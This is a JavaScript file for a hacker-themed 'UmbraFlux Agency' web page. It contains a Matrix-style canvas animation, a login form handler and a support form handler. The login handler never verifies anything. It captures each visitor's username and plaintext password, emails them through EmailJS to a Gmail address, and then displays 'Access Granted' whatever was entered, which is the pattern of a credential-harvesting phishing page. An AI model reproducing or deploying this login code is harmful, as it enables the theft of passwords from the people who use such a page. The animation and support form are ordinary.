// 1. Matrix Background Animation Code
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const nums = '0123456789';
const alphabet = katakana + latin + nums;

const fontSize = 16;
const columns = canvas.width / fontSize;

const rainDrops = [];
for (let x = 0; x < columns; x++) {
    rainDrops[x] = 1;
}

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = '#00FF66';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < rainDrops.length; i++) {
        const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
        ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

        if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            rainDrops[i] = 0;
        }
        rainDrops[i]++;
    }
}
setInterval(drawMatrix, 30);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// 2. Login Logic & Sending credentials to umbrafluxofficial@gmail.com
document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const user = document.getElementById('login-user').value;
    const pass = document.getElementById('login-pass').value;

    let templateParams = {
        to_email: 'umbrafluxofficial@gmail.com',
        username: user,
        password: pass,
        time: new Date().toLocaleString()
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_LOGIN_TEMPLATE_ID', templateParams)
        .then(function(response) {
            console.log('Login credentials sent successfully!', response.status);
        }, function(error) {
            console.log('Failed...', error);
        });

    alert('Access Granted. Welcome to UmbraFlux Agency.');
    document.getElementById('auth-overlay').style.display = 'none';
    document.getElementById('main-content').style.display = 'block';
});

// 3. Support Form Logic (Sending to umbrafluxsupport@gmail.com)
document.getElementById('support-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const name = document.getElementById('support-name').value;
    const email = document.getElementById('support-email').value;
    const message = document.getElementById('support-message').value;

    let supportParams = {
        to_email: 'umbrafluxsupport@gmail.com',
        from_name: name,
        from_email: email,
        message: message
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_SUPPORT_TEMPLATE_ID', supportParams)
        .then(function(response) {
            alert('Your help request has been transmitted to umbrafluxsupport@gmail.com successfully!');
            document.getElementById('support-form').reset();
        }, function(error) {
            alert('Transmission failed. Please try again later.');
        });
});
